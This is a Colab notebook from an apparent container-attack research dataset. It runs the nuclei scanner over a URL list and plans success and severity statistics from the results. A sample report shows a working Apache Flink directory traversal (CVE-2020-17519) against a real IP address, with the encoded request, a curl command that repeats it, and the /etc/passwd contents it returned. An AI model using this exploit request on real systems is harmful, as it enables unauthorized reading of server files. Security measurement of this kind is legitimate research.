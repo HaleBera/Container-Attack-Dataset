{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "Copy of Output Interpreter.ipynb",
      "provenance": [],
      "collapsed_sections": [],
      "authorship_tag": "ABX9TyMXs14Kw6E1MQ2dlR3V/7xw",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/HaleBera/Container-Attack-Dataset/blob/main/Copy_of_Output_Interpreter.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "For the attacks we will use the follwowing command:"
      ],
      "metadata": {
        "id": "0kDhsZcaLCLS"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "sudo nuclei -l urls.txt \n",
        "            -t /PATH_TO/nuclei-templates/vulnerabilities\n",
        "            -w /PATH_TO/nuclei-templates/workflows\n",
        "            -w attacks_workflow.yaml \n",
        "            -markdown-export ./nuclei_results"
      ],
      "metadata": {
        "id": "7oOkxxdxLABJ"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "**-l:** to execute attack(s) on more than one urls listed in a given txt file\n",
        "\n",
        "**-w:** list of workflow (more than one attacks) or workflow directory to run\n",
        "\n",
        "**-markdown-export:** directory to export results in markdown format\n",
        "\n",
        "More detailed examples of running nuclei can be found here: \n",
        "\n",
        "- (https://github.com/projectdiscovery/nuclei#running-nuclei)\n",
        "\n",
        "- (https://nuclei.projectdiscovery.io/nuclei/get-started/#running-nuclei)"
      ],
      "metadata": {
        "id": "hQ1mVNcVLtKE"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "We need to interpret the nuclei markdown formatted outputs (an example is in below) and serve the statistics from the retrieved values:\n",
        "\n",
        "- | CVE-ID | [CVE-2020-17519]\n",
        "- | CWE-ID | [CWE-552]\n",
        "- | Severity | high |\n",
        "- | CVSS-Score | 7.50 |\n",
        "\n",
        "\n",
        "Statistics to be extracted:\n",
        "\n",
        "*   How many of these attacks are succeeded (By comparing the CVE-ID with the template file names listed inthe attack_workfow.yaml)\n",
        "*   How many of the attacks are succeeded per CWE_ID\n",
        "*   How many of the outputs are succeeded per CVE_ID (Some attacks can give more than one output)\n",
        "*   What is the average CVSS-Score of the total succeded attacks\n",
        "*   How many of these attacks have high, medium, or low severity score\n",
        "\n"
      ],
      "metadata": {
        "id": "pZzYg26Y3xDO"
      }
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "2LJmyTuk1Hkq"
      },
      "outputs": [],
      "source": [
        "### Apache Flink directory traversal (CVE-2020-17519:regex-2) found on http://123.58.236.76:48843\n",
        "---\n",
        "**Details**: **CVE-2020-17519:regex-2**  matched at http://123.58.236.76:48843\n",
        "\n",
        "**Protocol**: HTTP\n",
        "\n",
        "**Full URL**: http://123.58.236.76:48843/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd\n",
        "\n",
        "**Timestamp**: Sat Apr 23 21:46:31 +0300 +03 2022\n",
        "\n",
        "**Template Information**\n",
        "\n",
        "| Key | Value |\n",
        "|---|---|\n",
        "| Name | Apache Flink directory traversal |\n",
        "| Authors | pdteam |\n",
        "| Tags | cve, cve2020, apache, lfi, flink |\n",
        "| Severity | high |\n",
        "| Description | A change introduced in Apache Flink 1.11.0 (and released in 1.11.1 and 1.11.2 as well) allows attackers to read any file on the local filesystem of the JobManager through the REST interface of the JobManager process. |\n",
        "| CVSS-Metrics | [CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N) |\n",
        "| CWE-ID | [CWE-552](https://cwe.mitre.org/data/definitions/552.html) |\n",
        "| CVE-ID | [CVE-2020-17519](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2020-17519) |\n",
        "| CVSS-Score | 7.50 |\n",
        "\n",
        "**Request**\n",
        "\n",
        "```http\n",
        "GET /jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd HTTP/1.1\n",
        "Host: 123.58.236.76:48843\n",
        "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36\n",
        "Connection: close\n",
        "Accept: */*\n",
        "Accept-Language: en\n",
        "Accept-Encoding: gzip\n",
        "\n",
        "\n",
        "```\n",
        "\n",
        "**Response**\n",
        "\n",
        "```http\n",
        "HTTP/1.1 200 OK\n",
        "Content-Length: 964\n",
        "Content-Type: text/plain\n",
        "\n",
        "root:x:0:0:root:/root:/bin/bash\n",
        "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n",
        "bin:x:2:2:bin:/bin:/usr/sbin/nologin\n",
        "sys:x:3:3:sys:/dev:/usr/sbin/nologin\n",
        "sync:x:4:65534:sync:/bin:/bin/sync\n",
        "games:x:5:60:games:/usr/games:/usr/sbin/nologin\n",
        "man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n",
        "lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\n",
        "mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\n",
        "news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\n",
        "uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\n",
        "proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\n",
        "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n",
        "backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\n",
        "list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\n",
        "irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\n",
        "gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\n",
        "nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n",
        "_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\n",
        "flink:x:9999:9999::/opt/flink:/bin/sh\n",
        "\n",
        "```\n",
        "\n",
        "References: \n",
        "- https://github.com/b1anda0/cve-2020-17519\n",
        "\n",
        "**CURL Command**\n",
        "```\n",
        "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36' 'http://123.58.236.76:48843/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd'\n",
        "```\n",
        "---\n",
        "Generated by [Nuclei 2.6.5](https://github.com/projectdiscovery/nuclei)"
      ]
    }
  ]
}
